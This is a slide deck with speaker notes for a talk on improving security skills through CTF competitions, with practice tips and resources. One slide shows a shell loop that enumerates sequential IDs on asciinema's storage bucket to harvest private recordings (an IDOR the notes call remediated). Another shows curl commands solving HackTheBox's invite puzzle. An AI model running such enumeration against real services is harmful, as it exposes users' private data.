class: center, middle, inverse
# Leveling Up With CTFs
[learning through competition]
.footnote[View source on [GitHub](https://github.com/audibleblink/ctf-talk)]

---
layout: false
class: center, middle

# Sometimes you win, sometimes you learn
.footnote[-- Abraham Lincoln, probably.]

---
class: inverse

.left-column[
# [Agenda](#)
]

.right-column[

  .right[

# CTFs: A _really_   Quick Intro
# Learning Styles
# Deliberate Practice
# After-Action Analysis
# DEMO!
# After-Action Analysis of the Demo
# Resources

  ]
]

???
* really quick intro for those unfamiliar
* the importance of learning style wrt to absorbing more information
  - so much research on the topic of pedagogy, it's fascinating, but we're sticking to learning
    style for appreoaching CTFs
* deliberate practice, with the goal of getting better and not just playing
* AAR analysis of what just happened. What do we do once we have a flag?

---
class: center, middle, inverse
# CTFs
### [[What](#) are they?]

---

.left-column[
# What is it?
]

.right-column[
# A collection of challenges designed to test skill.
.paragraph[
- Reverse engineering
- Webapp Exploitation  
- Crypto  
- Forensics  
- Exploitation  
- Steganography  
- OS / Network  
]
]

---

.left-column[
# How do I win?
]

## Flags are trophies that prove you've completed a challenge.
.right-column[

```
FLAG{d41d8cd9e980fuo0998ecf8427e}
CTF{y0ur3_s0_1337_u_f0unD_tHe_fl4g}
# or whatever the CTF rules say the flag format is
```

.paragraph[
- Documents
- Cracked Passwords
- Logs
- Database Tables
- Network Packets
- Audio Files
- Metadata
]


]

---
class: center, middle, inverse
# Getting Started
### [[Understanding](#) How You Learn]

---

class: inverse
# Test Case  | __asciinema__
<a href="https://asciinema.org/a/110084?t=20" target="_blank" ><img style="width: 100%; " src="https://asciinema.org/a/183006.png" /></a>

???
Because the goal is to get better at offense in the real world,
let's use a remediate real-world example. 
To be clear, this no longer works.

---
.left-column[
# Different Learning Stages

------

## Test Case:

## asciinema.org
]

???
## Example problem: IDOR on asciinema

#### Answers First
If I get absolutely stuck, I come here

Seeing the answers usually surface more questions
* wtf is that?!
* how does one know to reach for this tool or technology

#### Practical Application First
This one is me. I want to learn things that help
me solve problems directly in front of me.

#### Basics

Learning the HTTP Spec

There's always time to come back and learn this.
In fact, you'll need to if you want to level up
into security research or finding new TTPs

--
.right-column[
### Answer First?
]

--
.right-column[
```sh
1| base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
2| endpoint='/uploads/asciicast/file/_/ascii.cast'
3| key='?AWSAccessKeyId=xxxx-xxxx-xxxx'
4| for id in $(seq 10000 99999); do
5|   uri="${base}${endpoint/_/$id}${key}"
6|   curl -sL "${uri}" >> dump.loot
7| done
8| 
9| grep 'PRIVATE' dump.loot
```
]


--
.right-column[
### Practical Application First?
Find sensitive data on asciinema.org  
**Hint**: IDOR
]

--
.right-column[
### Basics First?
]

--
.right-column[
* RFC 2616  -  Hypertext Transfer Protocol
* Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
]

---
class: center, middle

# Regardless of Style, Understand your Tools

???
There is no correct order for these styles...

Nor are they linear. Can very well be a cycle.

- Make it easy for yourself to learn
- Eliminate unnecessary congitive load and leave more for learning
- Don't fight with your tools while learning
- Read man Pages
- Learn your shell
- Bootcamps and Ruby

--
a.k.a `man $tool` and `--help` all the things!

--

 http://overthewire.org/wargames/

---
class: center, middle, inverse
# Deliberate Practice

---

# Vulnhub.com

???
repository of vulnerable machines
--

- Use the Walkthroughs
- Resist the feeling that it's 'cheating'

???
- Start with walkthroughs as intruction manuals
- After 2-4, try alone
- Creep scroll just enough to get unstuck

--

# Find Ongoing CTFs

--

- HackTheBox.eu
- CTF Archives

--

# Social Learning

--

* Live Events
* Communities
  - Meetup.com
  - NetSecFocus Mattermost - chat.netsecfocus.com

???

---
class: center, middle, inverse
# Learning Doesn't Stop With the Flag
### [[After](#) Action Analysis]
---

.left-column[
# Keep it Going!

]
.right-column[
## How many ways can you explain it?
]

???
Finding multiple ways to explain a single solution forces your brain to approach it from multiple
angles. This sometime shines a light on topic you previousyly thought you understood but actually
took for granted.

--
.right-column[
- Write it up!
]

--
.right-column[
## How many ways can you solve it?
]

???
Flag or not, there's probably another vulnerability in this machine that presents a learning
opportunity. Sometimes they're not even the solution the box creator intended.

This is a perfect opportuntiy for social learning. People tend to open up more about their
solutions once you've already found your own way in.

--
.right-column[
- Are there other vectors?
- What about a different exploit?
]

--
.right-column[
## How would you solve this without tool X?
]

--
.right-column[
* Reconceptualize your approach
* Surface any weaknesses or crutches
]

???

* I love this as an interview question
* This is similar to the previous point
* Retrace your step, but artificially limit your tools
* This surfaces any weaknesses or dependencies and allows you to list them for later reserch

--
.right-column[
## How would I automate this?
]

--
.right-column[
* Think Deterministically
]

???
This one is my favorite. It's essentially a different version of 'How do you explain it?'

By automating the solution, you're forced to think about the problem in a deterministic way.

You encounter edge cases that could introduce more learning opportuinities along the way.

---
class: center, middle, inverse
# Show me!
  https://hackthebox.eu/invite

---
class: center, middle, inverse
# Dogfood
  https://hackthebox.eu/invite

---
class: middle
# Explain it

.paragraph[
>After inspecting the network traffic, some obfuscated code was found.
The code brought our attention to a function in the global scope, `makeInviteCode()`
This function POSTs to endpoint `/how/to/generate/invite` which returns some encoded JSON.
Upon decoding, we're instructed to POST to another endpoint. The response data from that second
endpoint is the encoded invite code for HTB.
]

---
# How Else Can We Solve it?

--

#### -- Manually inspect all non-standard globally defined functions
#### -- Use Burp Suite to see calls that are made
#### -- Bruteforce the API endpoints

--

# What If We Can't Use Postman?

--

#### -- jQuery from the DevTools Console
#### -- curl
#### -- Python Requests
#### -- Ruby Net::HTTP

---
class: middle

# AUTOMATE IT!!

```bash
# API Endpoint Information Disclosure
1  curl -sL -X POST \
2    'https://www.hackthebox.eu/api/invite/how/to/generate' \
3    | jq '.data.data' \ # pull data.data property from resulting json
4    | tr -d '"' \       # delete all instances of the "
5    | base64 -d         # decode base64


#> In order to generate the invite code,
#> make a POST request to /api/invite/generate%


# Call 'hidden' endpoint
6  curl -sL -X POST \
7    'https://www.hackthebox.eu/api/invite/generate' \
8    | jq -r '.data.code' \ # I learned about -r making this slide!
9    | base64 -d

```

---

class: center, inverse, middle
# Resources
???
So many resources, but I'm only going to list a minimun so as to not overwhelm
---
class: middle
# CTF Events and Exercises

### CMU PPP-written challenges - https://picoctf.com/

### Embedded Security CTF - https://microcorruption.com/login

### Global CTF Leaderboards - https://ctftime.org

---
class: right middle
# Online Resources

### Vulnerable machines and walkthroughs

https://vulnhub.com

### Retired HackTheBox machines

https://youtube.com/ippsec

### Old CTF WriteUps

https://github.com/ctfs

---
class: middle
.left-column[
# Topics
]
.right-column[
##**Reverse Engineering** - _Practical Reverse Engineering_
]
.right-column[
##**Scripting** - _Violent Python_
]

.right-column[
##**Web** - _Web Application Hackers Handbook_
]

.right-column[
##**Crypto** - _Applied Cryptography_
]

.right-column[
##**Binary Exploitation** - _Hacking: The Art of Exploitation_
]


.right-column[
##**All-In-One** - https://trailofbits.github.io/ctf/
]
---
class: center, inverse, middle
# Good Luck and Have Fun!
## * https://alexflor.es/ctf-talk
## * twitter/4lex

